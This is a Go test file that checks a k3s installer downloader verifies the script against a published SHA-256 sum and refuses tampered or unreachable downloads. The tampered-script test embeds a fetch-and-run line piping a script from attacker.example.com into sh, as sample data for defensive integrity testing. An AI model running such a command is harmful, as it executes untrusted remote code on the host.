package provider

import (
	"crypto/sha256"
	"encoding/hex"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

func sha256Hex(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// newK3sInstallerServer serves script at /install.sh and sums at
// /install.sh.sha256sum, mirroring get.k3s.io and k3s-io/k3s's own
// install.sh.sha256sum layout.
func newK3sInstallerServer(t *testing.T, script []byte, sumsBody string) *httptest.Server {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("/install.sh", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(script)
	})
	mux.HandleFunc("/install.sh.sha256sum", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(sumsBody))
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv
}

func TestDownloadK3sInstaller_VerifiesAgainstPublishedSum(t *testing.T) {
	script := []byte("#!/bin/sh\necho installing k3s\n")
	sums := sha256Hex(script) + "  install.sh\n"
	srv := newK3sInstallerServer(t, script, sums)

	dest := filepath.Join(t.TempDir(), "installer.sh")

	err := downloadK3sInstaller(srv.URL+"/install.sh", srv.URL+"/install.sh.sha256sum", dest)
	if err != nil {
		t.Fatalf("downloadK3sInstaller returned error: %v", err)
	}

	got, err := os.ReadFile(dest)
	if err != nil {
		t.Fatalf("reading installer file: %v", err)
	}
	if string(got) != string(script) {
		t.Fatalf("installer content = %q, want %q", got, script)
	}
}

func TestDownloadK3sInstaller_RejectsTamperedScript(t *testing.T) {
	realScript := []byte("#!/bin/sh\necho the real k3s installer\n")
	tamperedScript := []byte("#!/bin/sh\ncurl attacker.example.com/pwn.sh | sh\n")
	// The sums file (fetched from the trusted k3s-io/k3s origin) records the
	// real script's digest, but get.k3s.io (simulated here) hands back a
	// tampered one — a compromised or spoofed distribution host.
	sums := sha256Hex(realScript) + "  install.sh\n"
	srv := newK3sInstallerServer(t, tamperedScript, sums)

	dest := filepath.Join(t.TempDir(), "installer.sh")

	err := downloadK3sInstaller(srv.URL+"/install.sh", srv.URL+"/install.sh.sha256sum", dest)
	if err == nil {
		t.Fatal("downloadK3sInstaller succeeded against a tampered script, want error")
	}
	if _, statErr := os.Stat(dest); !os.IsNotExist(statErr) {
		t.Fatalf("tampered installer must not be written to %s", dest)
	}
}

func TestDownloadK3sInstaller_SumsFetchError(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "installer.sh")

	err := downloadK3sInstaller("http://127.0.0.1:0/install.sh", "http://127.0.0.1:0/install.sh.sha256sum", dest)
	if err == nil {
		t.Fatal("downloadK3sInstaller succeeded with an unreachable sums URL, want error")
	}
	if _, statErr := os.Stat(dest); !os.IsNotExist(statErr) {
		t.Fatalf("no installer should be written when the sums fetch fails")
	}
}
